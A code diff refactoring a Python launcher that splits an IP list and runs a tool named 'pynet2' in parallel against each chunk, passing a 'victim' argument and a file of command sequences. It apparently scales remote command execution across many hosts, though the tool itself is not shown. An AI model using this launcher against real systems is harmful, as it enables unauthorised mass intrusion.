@@ -8,7 +8,7 @@ import sys
 import signal
 import argparse
 import multiprocessing
-from multiprocessing import Process
+from multiprocessing import Process, Pool
 
 # Global list
 processes = []
@@ -105,10 +105,20 @@ def split_file(input_path, number):
 
 
 # Call a single pynet
+#def call_pynet(ip_file, port, victim, sequence_path):
+    #global pynet2_executable
+    #os.system(f"python {pynet2_executable} -iL {ip_file} -p {port} -l -v {victim}")
+    #os.system(f"python {pynet2_executable} -iL {ip_file} -p {port} -l -v {victim} -iC {sequence_path}")
+
+
 def call_pynet(ip_file, port, victim, sequence_path):
     global pynet2_executable
-    #os.system(f"python {pynet2_executable} -iL {ip_file} -p {port} -l -v {victim}")
-    os.system(f"python {pynet2_executable} -iL {ip_file} -p {port} -l -v {victim} -iC {sequence_path}")
+    command = [
+        "python", pynet2_executable, "-iL", ip_file, "-p", str(port), "-l", "-v", victim, "-iC", sequence_path
+    ]
+    result = subprocess.run(command, capture_output=True, text=True)
+    if result.returncode != 0:
+        print(f"[!] Error running command for {ip_file}: {result.stderr}")
 
 
 # Call the multiprocessing method for parallelizing
@@ -140,19 +150,23 @@ def main():
     split_file(args.ip_list, number_processes)
 
     print()
-    for ip_file in splitted_files:
-        p = Process(target=call_pynet, args=(ip_file, args.port, args.victim, args.commands_list))
-        processes.append(p)
-        p.start()
+    # Using a pool to parallelize `call_pynet`
+    with Pool(processes=number_processes) as pool:
+        pool.starmap(call_pynet, [(ip_file, args.port, args.victim, args.commands_list) for ip_file in splitted_files])
 
-    print(Colors.GREEN + f"\n[!] Command executes on {ip_file} begins with {number_processes} processes" + Colors.R)
+
+    #for ip_file in splitted_files:
+    #    p = Process(target=call_pynet, args=(ip_file, args.port, args.victim, args.commands_list))
+    #    processes.append(p)
+    #    p.start()
+
+    #print(Colors.GREEN + f"\n[!] Command executes on {ip_file} begins with {number_processes} processes" + Colors.R)
 
     # Wait for all processes to complete
-    for p in processes:
-        p.join()
+    #for p in processes:
+    #    p.join()
 
 
 
 if __name__ == "__main__":
-
     main()
